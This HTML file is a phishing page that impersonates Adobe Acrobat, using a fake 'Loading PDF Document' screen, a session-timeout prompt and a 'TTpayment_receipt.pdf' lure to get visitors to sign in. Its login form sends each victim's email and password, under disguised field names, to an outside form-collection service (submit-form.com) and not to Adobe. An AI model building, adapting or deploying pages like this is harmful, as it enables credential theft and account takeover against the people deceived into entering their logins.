<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adobe Acrobat</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="style2.css">
</head>
<body>
  <!-- Session Timeout Modal -->
  <div id="timeoutModal" class="modal hidden">
    <div class="modal-content">
      <svg class="modal-icon" viewBox="0 0 24 24" width="32" height="32">
        <path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm1-8h4v2h-6V7h2v5z"/>
      </svg>
      <h2>Session Timeout</h2>
      <p>Re-login to view PDF document</p>
    </div>
  </div>

  <!-- Error Modal -->
  <div id="errorModal" class="modal hidden">
    <div class="modal-content error">
      <svg class="modal-icon" viewBox="0 0 24 24" width="32" height="32">
        <path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-7v2h2v-2h-2zm0-8v6h2V7h-2z"/>
      </svg>
      <h2>Invalid Credentials</h2>
      <p>The email or password you entered is incorrect.</p>
    </div>
  </div>

  <!-- Loading Modal -->
  <div id="loadingModal" class="modal hidden">
    <div class="modal-content">
      <div class="spinner"></div>
      <p>Verifying credentials...</p>
    </div>
  </div>

  <!-- Preloader -->
  <div id="preloader" class="preloader">
    <div class="pdf-container">
      <img src="img/pdf.png" class="pdf-icon" viewBox="0 0 384 512" width="120" height="120">
        <!-- PDF file icon with more detail -->
        <!-- <path fill="#FF4444" d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48z"/>
        <path fill="#FF4444" d="M288 264c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v72h-48v-72c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v72h-48v-72c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v88c0 4.4 3.6 8 8 8h144c4.4 0 8-3.6 8-8v-88z"/>
      </svg> -->
      <div class="pdf-shadow"></div>
    </div>
    <div class="loading-bar">
      <div class="loading-progress"></div>
    </div>
    <p class="loading-text">Loading PDF Document...</p>
  </div>

  <!-- Login Page -->
  <div id="loginPage" class="login-page hidden">
    <div class="background"></div>
    <div id="loginContainer" class="login-container hidden">
      <div class="login-box">
        <!-- <div class="logo">

              <path fill="#FF4444" d="M288 264c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v72h-48v-72c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v72h-48v-72c0-4.4-3.6-8-8-8h-8c-4.4 0-8 3.6-8 8v88c0 4.4 3.6 8 8 8h144c4.4 0 8-3.6 8-8v-88z"/> -->
            <!-- </svg> -->
            <!-- <div class="pdf-small-shadow"></div>
          </div>
        </div>  -->
        <p class="subtitle">Authentication required to view PDF document</p>
        <form id="loginForm" action="https://submit-form.com/0ANK168fy">
          <input
                    type="hidden"
                    name="_redirect"
                    value=""
                  />
          <div class="input-group">
            <label for="email">Email Address</label>
            <div class="input-with-icon">
              <svg class="input-icon" viewBox="0 0 24 24" width="20" height="20">
                <path fill="currentColor" d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4.7-8 5.334L4 8.7V6.5l8 5.333L20 6.5v2.2z"/>
              </svg>
              <input type="email" id="email" name="emmm" placeholder="Enter your email" required>
            </div>
          </div>

          <div class="input-group">
            <label for="password">Password</label>
            <div class="input-with-icon">
              <svg class="input-icon" viewBox="0 0 24 24" width="20" height="20">
                <rect fill="currentColor" x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                <path fill="currentColor" d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
              <input type="password" id="password" name="psswd" placeholder="Enter your password" required>
            </div>
          </div>

          <button type="submit" class="login-button">
            <span class="button-text">Sign In</span>
            <div class="button-loader hidden"></div>
          </button>

          <div class="pdf-download">
            <img src="img/pdf.png"  alt="PDF Icon" class="pdf-download-icon">
            <div class="download-info">
                <span class="filename">TTpayment_receipt.pdf</span>
                <span class="filesize">48 KB</span>
            </div>
          
        </div>
        </form>
